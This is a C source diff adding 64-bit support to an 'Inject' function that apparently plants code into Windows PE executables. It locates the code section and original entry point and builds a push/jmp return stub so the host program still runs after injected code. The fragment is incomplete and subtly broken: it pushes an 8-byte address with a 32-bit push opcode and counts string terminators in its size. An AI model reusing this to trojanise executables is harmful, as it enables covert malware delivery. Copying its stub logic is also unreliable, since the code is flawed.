@@ -105,4 +105,29 @@ VOID writeBinary(PE pe, char* fileName, DWORD size) {
 VOID Inject(LPVOID fileData, DWORD size, char* code, DWORD codeSize, char* outPath) {
 	PE pe = parsePEFile(fileData);
 	
+	if (is64(fileData)) {
+		int codeSection = 0;
+		for (int i = 0; i < pe.ntHeader64.FileHeader.NumberOfSections; i++) {
+			if (pe.sectionHeader[i].Characteristics & IMAGE_SCN_CNT_CODE) {
+				codeSection = i;
+				break;
+			}
+		}
+		DWORD64 imageBase = pe.ntHeader64.OptionalHeader.ImageBase;
+		DWORD64 OEP = pe.ntHeader64.OptionalHeader.AddressOfEntryPoint;
+		DWORD64 baseOEP = imageBase + OEP;
+		if (baseOEP < imageBase) {
+			Error("Unexpected Error.", FALSE, TRUE, 1);
+		}
+		char push[] = "\x68";
+		char jmp[] = "\xff\x24\x24";
+		char hexOEP[8] = {};
+		for (int i = 0; i < 8; i++) {
+			hexOEP[i] = baseOEP >> (i * 8) & 0xff;
+			printf("%02x ", hexOEP[i]);
+		}
+
+		int injectSize = sizeof(push) + sizeof(jmp) + sizeof(hexOEP) + codeSize;
+
+	}
 }
